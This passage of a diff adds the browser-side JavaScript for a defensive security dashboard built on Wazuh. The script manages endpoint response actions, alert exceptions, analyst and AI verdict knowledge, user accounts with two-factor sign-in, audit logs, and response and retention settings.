+  const name = el('label', null, 'Executable name', el('input', { name: 'name', placeholder: 'evil.exe' }));
+  const ip = el('label', null, 'IP address', el('input', { name: 'ip' }));
+  const hours = el('label', null, 'Hours', el('input', { name: 'hours', type: 'number', min: 1, max: 720 }));
+  const sync = () => { const a = sel.value; pid.hidden = name.hidden = !['kill', 'suspend', 'resume'].includes(a); ip.hidden = !['blockip', 'unblockip'].includes(a); hours.hidden = !['blockip', 'isolate'].includes(a); };
+  sel.addEventListener('change', sync);
+  f.replaceChildren(el('h3', null, `Action on ${agent.name}`), el('label', null, 'Action', sel), pid, name, ip, hours,
+    el('div', { class: 'actions' }, el('button', { class: 'btn', type: 'submit' }, 'Send'), el('button', { class: 'btn-line', type: 'button', onclick: closeDialog }, 'Cancel')));
+  f.onsubmit = async e => {
+    e.preventDefault();
+    const v = cleanForm(f);
+    const body = { action: v.action, agent_id: agent.id };
+    if (v.pid) body.pid = v.pid;
+    if (v.name) body.name = v.name;
+    if (v.ip) body.ip = v.ip;
+    if (v.hours) body.hours = Number(v.hours);
+    const ok = await act(() => api('/api/actions', { method: 'POST', body }), `${v.action} sent to ${agent.name}`);
+    if (ok) closeDialog();
+  };
+  sync();
+  $('#dialog').hidden = false;
+}
+async function loadAgents() {
+  const data = await act(() => api('/api/agents'));
+  if (!data) return;
+  const box = $('#agents');
+  box.replaceChildren(data.wazuh_error ? el('p', { class: 'banner' }, data.wazuh_error) : '',
+    ...data.agents.map(a => el('div', { class: 'panel' },
+      el('div', { class: 'agent-head' }, el('h3', null, a.name), chip(a.status || 'unknown', a.status === 'active' ? 'done' : 'failed'),
+        a.isolated ? chip('isolated', 'high') : null, el('span', { class: 'muted' }, `${a.ip || '-'} · ${(a.groups || []).join(', ') || 'no group'} · ${a.os || ''}`),
+        el('span', { class: 'muted' }, `${a.alerts_24h || 0} alerts in 24 h · ${a.open_cases || 0} open cases`),
+        a.id && can('analyst') && (a.platform || 'windows') === 'windows' ? el('button', { class: 'btn-line', type: 'button', onclick: () => actionDialog(a) }, 'Actions…') : null),
+      a.sources_error ? el('p', { class: 'muted small' }, a.sources_error) : null,
+      (a.sources || []).length ? table(['Log source', 'Events', 'Dropped'], a.sources.map(s => el('tr', null, el('td', null, s.location), el('td', { class: 'num' }, s.events), el('td', { class: 'num' }, s.drops ? chip(String(s.drops), 'failed') : '0'))), '') : null)));
+}
+
+// ------------------------------------------------------------------ knowledge and exceptions
+async function loadKnowledge() {
+  const f = cleanForm($('#knowledge-filters'));
+  const rows = await act(() => api(`/api/knowledge?state=${f.state}&q=${encodeURIComponent(f.q || '')}`));
+  if (!rows) return;
+  const upd = (k, body, msg) => act(async () => { await api(`/api/knowledge/${encodeURIComponent(k.signature)}`, { method: 'PUT', body }); loadKnowledge(); }, msg);
+  $('#knowledge').replaceChildren(table(['Behaviour', 'Verdict', 'Source', 'Reused', 'Expires', 'Updated', ''], rows.map(k => el('tr', null,
+    el('td', null, k.rule_desc || '-', el('div', { class: 'muted small mono' }, k.signature.slice(0, 16))), el('td', null, verdictNode(k.verdict)),
+    el('td', null, k.source), el('td', { class: 'num' }, k.hits), el('td', { class: 'nowrap' }, k.disabled ? 'switched off' : relTime(k.expires_at)),
+    el('td', null, relTime(k.updated_at), k.updated_by ? el('div', { class: 'muted small' }, k.updated_by) : null),
+    el('td', { class: 'row-actions' }, can('analyst') ? [
+      el('button', { class: 'btn-line', type: 'button', onclick: () => upd(k, { renew_days: Number(k.source === 'ai' ? state.settings.knowledge_ttl_ai_days : state.settings.knowledge_ttl_analyst_days) || 30 }, 'Renewed') }, 'Renew'),
+      el('button', { class: 'btn-line', type: 'button', onclick: () => upd(k, { verdict: k.verdict === 'FP' ? 'TP' : 'FP' }, 'Verdict changed') }, k.verdict === 'FP' ? 'Mark TP' : 'Mark FP')] : null,
+    can('admin') ? [el('button', { class: 'btn-line', type: 'button', onclick: () => upd(k, { disabled: !k.disabled }, k.disabled ? 'Switched on' : 'Switched off') }, k.disabled ? 'Switch on' : 'Switch off'),
+      el('button', { class: 'btn-line', type: 'button', onclick: () => window.confirm('Delete this knowledge?') && act(async () => { await api(`/api/knowledge/${encodeURIComponent(k.signature)}`, { method: 'DELETE' }); loadKnowledge(); }, 'Deleted') }, 'Delete')] : null))),
+    'No knowledge in this state.'));
+}
+$('#knowledge-filters').addEventListener('input', () => { clearTimeout(filterTimer); filterTimer = setTimeout(loadKnowledge, 300); });
+$('#knowledge-filters').addEventListener('submit', e => e.preventDefault());
+
+const exceptionBody = x => ({ rule_id: x.rule_id ? Number(x.rule_id) : null, scope: x.scope, scope_value: x.scope_value || null, match_type: x.match_type,
+  match_value: x.match_value || null, effect: x.effect, enabled: x.enabled !== false, expires_days: x.expires_days ? Number(x.expires_days) : null, note: x.note || null });
+$('#exception-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const ok = await act(() => api('/api/exceptions', { method: 'POST', body: exceptionBody(cleanForm(e.target)) }), 'Exception added');
+  if (ok) { e.target.reset(); loadExceptions(); }
+});
+async function loadExceptions() {
+  const rows = await act(() => api('/api/exceptions'));
+  if (!rows) return;
+  $('#exception-form').hidden = !can('admin');
+  const daysLeft = x => x.expires_at ? Math.max(1, Math.round((new Date(x.expires_at) - Date.now()) / 86400000)) : null;
+  $('#exceptions').replaceChildren(table(['Rule', 'Scope', 'Match', 'Effect', 'Hits', 'Expires', 'Note', ''], rows.map(x => el('tr', null,
+    el('td', null, x.rule_id || 'any'), el('td', null, x.scope === 'global' ? 'all hosts' : `${x.scope} ${x.scope_value}`),
+    el('td', { class: 'mono' }, `${x.match_type}${x.match_value ? `: ${x.match_value}` : ''}`), el('td', null, chip(x.effect, x.effect === 'suppress' ? 'medium' : 'low')),
+    el('td', { class: 'num' }, x.hits), el('td', null, x.expires_at ? relTime(x.expires_at) : 'never'), el('td', null, x.note || '', el('div', { class: 'muted small' }, x.created_by || '')),
+    el('td', { class: 'row-actions' }, can('admin') ? [
+      el('button', { class: 'btn-line', type: 'button', onclick: () => act(async () => { await api(`/api/exceptions/${x.id}`, { method: 'PUT', body: exceptionBody({ ...x, expires_days: daysLeft(x), enabled: !x.enabled }) }); loadExceptions(); }, x.enabled ? 'Switched off' : 'Switched on') }, x.enabled ? 'Switch off' : 'Switch on'),
+      el('button', { class: 'btn-line', type: 'button', onclick: () => window.confirm('Delete this exception?') && act(async () => { await api(`/api/exceptions/${x.id}`, { method: 'DELETE' }); loadExceptions(); }, 'Deleted') }, 'Delete')] : null))),
+    'No exception.'));
+}
+
+// ------------------------------------------------------------------ users and audit (admin)
+function showTemp(user, password) {
+  const p = $('#temp-password');
+  p.replaceChildren(`Temporary password for ${user}: `, el('b', { class: 'mono' }, password), '. Give it to the user securely; they must change it at the next sign-in. It is not shown again.');
+  p.hidden = false;
+}
+$('#user-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const f = cleanForm(e.target);
+  const r = await act(() => api('/api/users', { method: 'POST', body: { username: f.username, role: f.role, telegram_id: f.telegram_id ? Number(f.telegram_id) : null } }), 'User created');
+  if (r) { showTemp(f.username, r.temporary_password); e.target.reset(); loadUsers(); }
+});
+async function loadUsers() {
+  const data = await act(() => api('/api/users'));
+  if (!data) return;
+  const resetFor = async name => {
+    const u = data.users.find(x => x.username === name);
+    if (!u || !window.confirm(`Give ${name} a new temporary password?`)) return;
+    const r = await act(() => api(`/api/users/${u.id}/reset-password`, { method: 'POST' }), 'Password reset');
+    if (r) { showTemp(name, r.temporary_password); loadUsers(); }
+  };
+  const upd = (u, body, msg) => act(async () => { await api(`/api/users/${u.id}`, { method: 'PUT', body }); loadUsers(); }, msg);
+  $('#reset-requests').replaceChildren(data.reset_requests.length ? el('div', { class: 'panel' }, el('h3', null, 'Password reset requests'),
+    table(['User', 'Asked', 'From', ''], data.reset_requests.map(r => el('tr', null, el('td', null, r.username), el('td', null, relTime(r.requested_at)), el('td', null, r.requester_ip || '-'),
+      el('td', { class: 'row-actions' }, el('button', { class: 'btn', type: 'button', onclick: () => resetFor(r.username) }, 'Reset password'),
+        el('button', { class: 'btn-line', type: 'button', onclick: () => act(async () => { await api(`/api/password-resets/${r.id}/dismiss`, { method: 'POST' }); loadUsers(); }, 'Dismissed') }, 'Dismiss')))), '')) : '');
+  $('#users').replaceChildren(table(['User', 'Role', 'Two-factor', 'Telegram', 'Last sign-in', 'State', ''], data.users.map(u => el('tr', null,
+    el('td', null, u.username), el('td', null, el('select', { 'aria-label': `Role of ${u.username}`, onchange: e => upd(u, { role: e.target.value }, 'Role changed') },
+      ['viewer', 'analyst', 'admin'].map(r => el('option', { value: r, selected: u.role === r }, r)))),
+    el('td', null, u.totp_enabled ? 'on' : 'off'), el('td', null, u.telegram_id || '-'), el('td', null, relTime(u.last_login_at)),
+    el('td', null, u.disabled ? chip('disabled', 'failed') : u.locked_until && new Date(u.locked_until) > new Date() ? chip('locked', 'medium') : u.must_change ? chip('temporary password', 'medium') : chip('active', 'done')),
+    el('td', { class: 'row-actions' }, el('button', { class: 'btn-line', type: 'button', onclick: () => resetFor(u.username) }, 'Reset password'),
+      u.totp_enabled ? el('button', { class: 'btn-line', type: 'button', onclick: () => window.confirm(`Remove two-factor sign-in of ${u.username}?`) && act(async () => { await api(`/api/users/${u.id}/reset-totp`, { method: 'POST' }); loadUsers(); }, 'Two-factor removed') }, 'Reset two-factor') : null,
+      el('button', { class: 'btn-line', type: 'button', onclick: () => { const v = window.prompt(`Telegram user id of ${u.username} (empty = none)`, u.telegram_id || ''); if (v !== null) upd(u, v.trim() ? { telegram_id: Number(v) } : { clear_telegram: true }, 'Telegram id saved'); } }, 'Telegram id'),
+      el('button', { class: 'btn-line', type: 'button', onclick: () => upd(u, { disabled: !u.disabled }, u.disabled ? 'Enabled' : 'Disabled') }, u.disabled ? 'Enable' : 'Disable'),
+      u.username !== state.me.user ? el('button', { class: 'btn-line', type: 'button', onclick: () => window.confirm(`Delete ${u.username}?`) && act(async () => { await api(`/api/users/${u.id}`, { method: 'DELETE' }); loadUsers(); }, 'Deleted') }, 'Delete') : null))), ''));
+}
+async function loadAudit() {
+  const f = cleanForm($('#audit-filters'));
+  const rows = await act(() => api(`/api/audit?days=${f.days}&user=${encodeURIComponent(f.user || '')}&action=${encodeURIComponent(f.action || '')}`));
+  if (!rows) return;
+  $('#audit').replaceChildren(table(['When', 'User', 'Action', 'Target', 'Details', 'IP'], rows.map(a => el('tr', null,
+    el('td', { class: 'nowrap', title: fullTime(a.ts) }, fullTime(a.ts)), el('td', null, a.username || '-', a.role ? el('div', { class: 'muted small' }, a.role) : null),
+    el('td', null, a.action), el('td', null, a.target || ''), el('td', { class: 'mono small' }, a.details ? JSON.stringify(a.details).slice(0, 300) : ''), el('td', null, a.ip || ''))),
+    'Nothing in this period.'));
+}
+$('#audit-filters').addEventListener('input', () => { clearTimeout(filterTimer); filterTimer = setTimeout(loadAudit, 300); });
+$('#audit-filters').addEventListener('submit', e => e.preventDefault());
+
+// ------------------------------------------------------------------ settings
+const SECTIONS = [
+  ['Response', [['auto_action', 'bool', 'Automatic actions'], ['kill_min_level', 'int', 'High risk from rule level', 1, 16], ['kill_min_confidence', 'float', 'High risk from TP confidence', 0, 1],
+    ['notice_min_level', 'int', 'Popup (medium risk) from rule level', 1, 16], ['kill_rate_host_hour', 'int', 'Automatic kills per host per hour', 0, 100],
+    ['kill_rate_global_hour', 'int', 'Automatic kills per hour, all hosts', 0, 1000], ['approval_timeout_minutes', 'int', 'Approval requests expire after (minutes)', 5, 1440],
+    ['suspend_on_request', 'bool', 'Suspend the process while its kill waits for approval'], ['auto_scan', 'bool', 'Defender quick scan after a kill'],
+    ['auto_evidence', 'bool', 'Collect light evidence for high-risk cases'], ['isolation_enabled', 'bool', 'Allow host isolation (always needs approval)'],
+    ['isolation_hours', 'int', 'Lift isolation after (hours)', 1, 72], ['blockip_hours', 'int', 'Unblock an IP after (hours)', 1, 720], ['process_allowlist', 'list', 'Process names never killed automatically']]],
+  ['Agent groups', 'groups'],
+  ['Detection', [['outbreak_hosts', 'int', 'Hosts with the same behaviour that make an outbreak', 2, 1000], ['outbreak_minutes', 'int', 'Outbreak window (minutes)', 5, 1440],
+    ['storm_cases', 'int', 'New cases that make an alert storm', 5, 10000], ['storm_minutes', 'int', 'Storm window (minutes)', 1, 120]]],
+  ['Data and AI', [['data_mode', 'enum', 'Data mode', ['local', 'cloud']], ['ai_enabled', 'bool', 'Use the AI in cloud mode'], ['ai_provider', 'enum', 'AI provider', ['gemini', 'claude', 'openai']],
+    ['ai_model', 'text', 'Model name'], ['ai_base_url', 'text', 'OpenAI-compatible base URL'], ['mask_level', 'enum', 'Masking before data reaches the AI', ['full', 'pseudonymize', 'secrets']],
+    ['ti_providers', 'multi', 'Threat intelligence (cloud mode)', ['virustotal', 'abuseipdb']]]],
+  ['Knowledge', [['knowledge_ttl_ai_days', 'int', 'AI verdicts reused for (days)', 1, 365], ['knowledge_ttl_analyst_days', 'int', 'Analyst verdicts reused for (days)', 1, 3650],
+    ['auto_close_analyst_fp', 'bool', 'Close cases that match an analyst false positive']]],
+  ['Retention', 'retention'],
+  ['Notifications', [['notify_min_risk', 'enum', 'Minimum risk for a case message', ['low', 'medium', 'high']], ['notify_channels', 'channels', 'Channels'],
+    ['telegram_chat_id', 'text', 'Telegram chat id'], ['telegram_approvals', 'bool', 'Approve / Reject buttons in Telegram'], ['dashboard_url', 'text', 'Dashboard address used in links'],
+    ['notice_text', 'text', 'Popup text shown to users'], ['templates', 'templates', 'Message templates']]],
+  ['Wazuh (the server applies these within a minute)', [['forward_soar_level', 'int', 'SOAR rules sent to n8n from level', 3, 16],
+    ['forward_builtin_level', 'int', 'Built-in Wazuh alerts sent to n8n from level (0 = never)', 0, 16], ['liveness_interval', 'int', 'Liveness check every (seconds)', 30, 3600],
+    ['liveness_groups', 'list', 'Groups checked for silent agents (empty = all)']]]];
+
+async function saveSetting(key, value, message = 'Saved') {
+  const ok = await act(() => api(`/api/settings/${key}`, { method: 'PUT', body: { value } }), message);
+  if (ok) state.settings[key] = ok.value;
+  return ok;
+}
+function control(key, type, label, a, b) {
+  const v = state.settings[key];
+  const ro = !can('admin');
+  let input, read;
+  if (type === 'bool') { input = el('input', { type: 'checkbox', checked: !!v, disabled: ro, 'aria-label': label }); read = () => input.checked; }
+  else if (type === 'int' || type === 'float') { input = el('input', { type: 'number', min: a, max: b, step: type === 'float' ? '0.05' : '1', value: v ?? '', disabled: ro, 'aria-label': label }); read = () => type === 'int' ? parseInt(input.value, 10) : parseFloat(input.value); }
+  else if (type === 'enum') { input = el('select', { disabled: ro, 'aria-label': label }, a.map(o => el('option', { value: o, selected: v === o }, o))); read = () => input.value; }
+  else if (type === 'list') { input = el('textarea', { disabled: ro, 'aria-label': label, placeholder: 'one per line' }); input.value = (v || []).join('\n'); read = () => input.value.split(/[\n,]/).map(x => x.trim()).filter(Boolean); }
+  else if (type === 'multi') { const boxes = a.map(o => el('label', { class: 'inline' }, el('input', { type: 'checkbox', value: o, checked: (v || []).includes(o), disabled: ro }), o)); input = el('span', { class: 'control' }, boxes); read = () => boxes.map(x => x.firstChild).filter(x => x.checked).map(x => x.value); }
+  else if (type === 'channels') { const boxes = ['telegram', 'teams', 'slack', 'discord'].map(o => el('label', { class: 'inline' }, el('input', { type: 'checkbox', value: o, checked: !!(v || {})[o], disabled: ro }), o)); input = el('span', { class: 'control' }, boxes); read = () => Object.fromEntries(boxes.map(x => [x.firstChild.value, x.firstChild.checked])); }
+  else { input = el('input', { type: 'text', value: v ?? '', disabled: ro, 'aria-label': label }); read = () => input.value; }
+  if (key === 'liveness_groups' && v === null) input.value = '';
+  return el('div', { class: 'setting' }, el('label', null, label), el('div', { class: 'control' }, input,
+    ro ? null : el('button', { class: 'btn-line', type: 'button', onclick: () => saveSetting(key, key === 'liveness_groups' && !read().length ? null : read()) }, 'Save')),
+    el('p', { class: 'muted small' }, state.descriptions[key] || ''));
+}
+function groupsPanel() {
+  const modes = state.settings.group_modes || {};
+  const auto = new Set(state.settings.auto_kill_groups || []);
+  const prof = state.settings.group_profiles || {};
+  const ro = !can('admin');
+  const tbody = el('tbody');
+  const addRow = (name = '', mode = 'notify', ak = false, profile = 'standard') => {
+    const modeSel = el('select', { disabled: ro }, ['contain', 'notify', 'monitor'].map(m => el('option', { value: m, selected: m === mode }, m)));
+    const akBox = el('input', { type: 'checkbox', checked: ak, disabled: ro || mode !== 'contain', 'aria-label': 'automatic kill' });
+    modeSel.addEventListener('change', () => { akBox.disabled = ro || modeSel.value !== 'contain'; if (akBox.disabled) akBox.checked = false; });
+    const tr = el('tr', null, el('td', null, el('input', { value: name, placeholder: 'group name', disabled: ro, 'aria-label': 'group' })), el('td', null, modeSel),
+      el('td', null, akBox), el('td', null, el('select', { disabled: ro }, ['standard', 'lean'].map(p => el('option', { value: p, selected: p === profile }, p)))),
+      el('td', null, ro ? null : el('button', { class: 'btn-quiet', type: 'button', onclick: () => tr.remove() }, 'Remove')));
+    tbody.append(tr);
+  };
+  Object.entries(modes).filter(([g]) => g !== '*').forEach(([g, m]) => addRow(g, m, auto.has(g), prof[g] || 'standard'));
+  const fallback = el('select', { disabled: ro }, ['notify', 'monitor'].map(m => el('option', { value: m, selected: modes['*'] === m }, m)));
+  const save = async () => {
+    const rows = [...tbody.rows].map(r => ({ g: r.cells[0].firstChild.value.trim(), m: r.cells[1].firstChild.value, ak: r.cells[2].firstChild.checked, p: r.cells[3].firstChild.value })).filter(r => r.g);
+    const newContain = rows.filter(r => r.m === 'contain' && modes[r.g] !== 'contain').map(r => r.g);
+    const newAuto = rows.filter(r => r.ak && !auto.has(r.g)).map(r => r.g);
+    if (newContain.length && !window.confirm(`contain lets SOAR-SME act on hosts of: ${newContain.join(', ')}. Continue?`)) return;
+    if (newAuto.length && !window.confirm(`Automatic kill without approval for: ${newAuto.join(', ')} (high-fidelity cases only, rate limits apply). Continue?`)) return;
+    const gm = Object.fromEntries(rows.map(r => [r.g, r.m]));
+    gm['*'] = fallback.value;
+    if (!await saveSetting('group_modes', gm, 'Groups saved')) return;
+    await saveSetting('auto_kill_groups', rows.filter(r => r.ak && r.m === 'contain').map(r => r.g), 'Automatic kill saved');
+    await saveSetting('group_profiles', Object.fromEntries(rows.map(r => [r.g, r.p])), 'Groups saved: the server applies them within a minute');
+    loadSettings();
+  };
+  return el('div', null, el('p', { class: 'muted small' }, state.descriptions.group_modes || ''),
+    el('table', { class: 'group-modes' }, el('thead', null, el('tr', null, ['Group', 'Mode', 'Auto-kill', 'Log profile', ''].map(h => el('th', null, h)))), tbody),
+    el('div', { class: 'control' }, ro ? null : el('button', { class: 'btn-line', type: 'button', onclick: () => addRow() }, 'Add group'),
+      el('label', { class: 'fallback' }, 'Hosts in no listed group:', fallback), ro ? null : el('button', { class: 'btn', type: 'button', onclick: save }, 'Save groups')));
+}
+function retentionPanel() {
+  const r = state.settings.retention || {};
+  const ro = !can('admin');
+  const fields = [['index_days', 'Wazuh alert indices', 7], ['low_days', 'Closed false-positive or low-risk cases', 1], ['case_days', 'Other closed cases', 1], ['action_days', 'Actions and approvals', 1], ['audit_days', 'Audit log', 30]];
+  const on = el('input', { type: 'checkbox', checked: r.enabled !== false, disabled: ro });
+  const inputs = fields.map(([k, label, min]) => el('label', null, `${label} (days)`, el('input', { type: 'number', min, max: 3650, value: r[k], name: k, disabled: ro })));
+  return el('div', null, el('p', { class: 'muted small' }, state.descriptions.retention || ''), el('label', { class: 'inline' }, on, 'Delete data older than:'),
+    el('div', { class: 'form-grid' }, inputs), ro ? null : el('button', { class: 'btn', type: 'button', onclick: () => saveSetting('retention',
+      Object.fromEntries([['enabled', on.checked], ...inputs.map(l => [l.lastChild.name, parseInt(l.lastChild.value, 10)])]), 'Retention saved: the server updates the Wazuh indices within a minute') }, 'Save retention'));
+}
+function templatesPanel() {
+  const t = state.settings.templates || {};
+  const ro = !can('admin');
+  const areas = Object.keys(t).map(k => el('label', null, k, el('textarea', { name: k, rows: 4, disabled: ro }, t[k])));
+  return el('div', null, el('p', { class: 'muted small template-help' }, 'Placeholders: {verdict} {risk} {case} {rule} {level} {technique} {host} {mode} {source} {confidence} {user} {process} {ti} {actions} {reasoning} {alerts} {link}; approvals: {action} {minutes}; decisions: {approval} {status} {who} {note}; incidents: {incident} {hosts} {host_list}; storms: {count} {top}. Unknown names become empty.'),
+    el('div', { class: 'form-grid' }, areas), ro ? null : el('button', { class: 'btn', type: 'button', onclick: () => saveSetting('templates', Object.fromEntries(areas.map(l => [l.lastChild.name, l.lastChild.value])), 'Templates saved') }, 'Save templates'));
+}
+function pauseControls() {
+  if (!can('analyst')) return null;
+  const until = state.settings.pause_auto_until;
+  const paused = until && new Date(until) > new Date();
+  const pause = minutes => act(async () => { await api('/api/pause', { method: 'POST', body: { minutes } }); await loadSettingsMap(); loadSettings(); }, `Automatic actions paused for ${minutes >= 60 ? minutes / 60 + ' h' : minutes + ' min'}`);
+  return el('div', { class: 'panel' }, el('h3', null, 'Pause automatic actions'), el('p', { class: 'muted small' }, paused ? `Paused until ${fullTime(until)}.` : 'Kills, popups, scans and evidence collection stop; approvals and manual actions keep working.'),
+    el('div', { class: 'actions' }, [30, 120, 480].map(m => el('button', { class: 'btn-line', type: 'button', onclick: () => pause(m) }, m >= 60 ? `${m / 60} hours` : `${m} minutes`)),
+      paused ? el('button', { class: 'btn', type: 'button', onclick: () => act(async () => { await api('/api/resume', { method: 'POST' }); await loadSettingsMap(); loadSettings(); }, 'Resumed') }, 'Resume now') : null));
+}
+async function loadSettings() {
+  if (!await act(loadSettingsMap)) return;
+  $('#settings-readonly').hidden = can('admin');
+  const special = { groups: groupsPanel, retention: retentionPanel };
+  $('#settings').replaceChildren(pauseControls() || '', ...SECTIONS.map(([title, items]) => el('section', { class: 'panel settings-section' }, el('h3', null, title),
+    typeof items === 'string' ? special[items]() : el('div', { class: 'settings-list' }, items.map(([k, type, label, a, b]) => type === 'templates' ? templatesPanel() : control(k, type, label, a, b))))));
+}
+
+// ------------------------------------------------------------------ account
+$('#password-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const f = cleanForm(e.target);
+  if (await act(() => api('/api/account/password', { method: 'POST', body: { current: f.current, new: f.new } }), 'Password changed')) {
+    e.target.reset();
+    await boot();
+  }
+});
+function loadAccount() {
+  const box = $('#totp-panel');
+  if (state.me.totp_enabled) {
+    const code = el('input', { name: 'code', inputmode: 'numeric', placeholder: '123456' });
+    box.replaceChildren(el('h3', null, 'Two-factor sign-in is on'), el('div', { class: 'control' }, code, el('button', { class: 'btn-line', type: 'button',
+      onclick: () => act(async () => { await api('/api/account/totp/disable', { method: 'POST', body: { code: code.value } }); state.me.totp_enabled = false; loadAccount(); }, 'Two-factor sign-in removed') }, 'Turn off')));
+    return;
+  }
+  box.replaceChildren(el('h3', null, 'Two-factor sign-in (optional)'), el('p', { class: 'muted small' }, 'Recommended for accounts that approve kills and isolations. Works with any TOTP app (Microsoft Authenticator, Google Authenticator, Aegis…).'),
+    el('button', { class: 'btn-line', type: 'button', onclick: async () => {
+      const r = await act(() => api('/api/account/totp/setup', { method: 'POST' }));
+      if (!r) return;
+      const code = el('input', { name: 'code', inputmode: 'numeric', placeholder: '123456' });
+      box.replaceChildren(el('h3', null, 'Add this account to your authenticator app'), el('p', null, 'Key: ', el('b', { class: 'mono' }, r.secret.match(/.{1,4}/g).join(' '))),
+        el('p', { class: 'muted small mono' }, r.uri), el('div', { class: 'control' }, code, el('button', { class: 'btn', type: 'button',
+          onclick: () => act(async () => { await api('/api/account/totp/enable', { method: 'POST', body: { code: code.value } }); state.me.totp_enabled = true; loadAccount(); }, 'Two-factor sign-in is on') }, 'Confirm')));
+    } }, 'Set up'));
+}
+
+boot();
+</script>
+</body>
+</html>
